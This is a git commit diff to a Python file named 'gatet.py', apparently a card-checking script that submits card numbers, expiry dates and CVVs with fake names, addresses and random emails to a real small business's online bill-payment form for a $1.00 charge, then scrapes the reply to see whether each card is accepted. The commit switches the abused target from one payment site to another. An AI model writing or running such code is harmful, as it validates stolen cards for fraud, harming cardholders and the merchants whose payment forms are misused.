9c30468caa401c9b29296fbeb3d8281c2ed72c7f
Rodamuser08 <rodamuser08@gmail.com>
2025-07-15 03:16:04 +0700

    Update gatet.py

--- gatet.py
+++ gatet.py
@@ -18,54 +18,61 @@ def Tele(ccx):
 	random_amount2 = random.randint(1, 99)
 	
 	headers = {
-	    'authority': 'www.idisecurepay.com',
-	    'accept': 'application/json, text/plain, */*',
+	    'authority': 'alarmsinc5280.com',
+	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
 	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
-	    'content-type': 'application/json;charset=UTF-8',
-	    'origin': 'https://www.idisecurepay.com',
-	    'referer': 'https://www.idisecurepay.com/?ou=24&name=Plays+of+the+Day&proc=s',
+	    'cache-control': 'max-age=0',
+	    'origin': 'https://alarmsinc5280.com',
+	    'referer': 'https://alarmsinc5280.com/pay-your-bill/',
 	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
-	    'sec-fetch-dest': 'empty',
-	    'sec-fetch-mode': 'cors',
+	    'sec-fetch-dest': 'iframe',
+	    'sec-fetch-mode': 'navigate',
 	    'sec-fetch-site': 'same-origin',
+	    'sec-fetch-user': '?1',
+	    'upgrade-insecure-requests': '1',
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
 	}
 	
-	json_data = {
-	    'email': f'rodamuser{random_amount1}{random_amount2}@gmail.com',
-	    'country': {
-	        'value': 'USA',
-	        'label': 'USA',
-	    },
-	    'phone': f'4303000{random_amount1}{random_amount2}',
-	    'address': 'Street 27',
-	    'city': 'New York',
-	    'state': {
-	        'value': 'NY',
-	        'label': 'New York',
-	    },
-	    'zip': '10080',
-	    'cardNumber': n,
-	    'cvv': cvc,
-	    'expiryDate': f'{mm}{yy}',
-	    'nameOnCard': 'Rodam User',
-	    'paymentAmount': 1,
-	    'terms': False,
-	    'transId': '',
-	    'meta': {
-	        'userId': '24',
-	        'name': 'Plays of the Day',
-	        'ispp': None,
-	        'referrer': None,
-	        'proc': 's',
-	        'isSandbox': False,
-	    },
-	}
+	files = [
+	    ('input_1.3', (None, 'Rodam')),
+	    ('input_1.6', (None, 'User')),
+	    ('input_16', (None, '1')),
+	    ('input_2', (None, f'rodamuser{random_amount1}{random_amount2}@gmail.com')),
+	    ('input_2_2', (None, f'rodamuser{random_amount1}{random_amount2}@gmail.com')),
+	    ('input_4.1', (None, 'Street 27')),
+	    ('input_4.2', (None, '')),
+	    ('input_4.3', (None, 'New York')),
+	    ('input_4.4', (None, 'New York')),
+	    ('input_4.5', (None, '10080')),
+	    ('input_4.6', (None, 'United States')),
+	    ('input_17', (None, '$1.00')),
+	    ('input_18', (None, '$1.00')),
+	    ('input_20.1', (None, f'{n}')),
+	    ('input_20.2[]', (None, f'{mm}')),
+	    ('input_20.2[]', (None, f'20{yy}')),
+	    ('input_20.3', (None, f'{cvc}')),
+	    ('input_20.5', (None, 'Rodam User')),
+	    ('gform_ajax', (None, 'form_id=1&title=&description=1&tabindex=0&theme=gravity-theme&styles=[]&hash=803ddb847338452f3b891f864c8a0102')),
+	    ('gform_submission_method', (None, 'iframe')),
+	    ('gform_theme', (None, 'gravity-theme')),
+	    ('gform_style_settings', (None, '[]')),
+	    ('is_submit_1', (None, '1')),
+	    ('gform_submit', (None, '1')),
+	    ('gform_unique_id', (None, '')),
+	    ('state_1', (None, 'WyJbXSIsImFjMzRhYTIzYzBiN2M0YTUzMDQxOGI5NzNhYTI3NDc0Il0=')),
+	    ('gform_target_page_number_1', (None, '0')),
+	    ('gform_source_page_number_1', (None, '1')),
+	    ('gform_field_values', (None, '')),
+	    ('version_hash', (None, 'cad79aeee17afc5c06094cbcde00d174')),
+	]
 	
-	response = session.post('https://www.idisecurepay.com/api/payment', headers=headers, json=json_data)
+	response = session.post('https://alarmsinc5280.com/pay-your-bill/', headers=headers, files=files)
 	
-	result = re.search(r'"message":"(.*?)"', response.text).group(1)
+	try:
+		result = re.search(r'Credit Card: (.*?)<\/a><\/li><\/ol><\/div>', response.text).group(1)
+	except:
+		result = re.search(r"class='gform_confirmation_message_1 gform_confirmation_message'>(.*?)<\/div><\/div><\/body>", response.text).group(1)
 		
 	return (result)
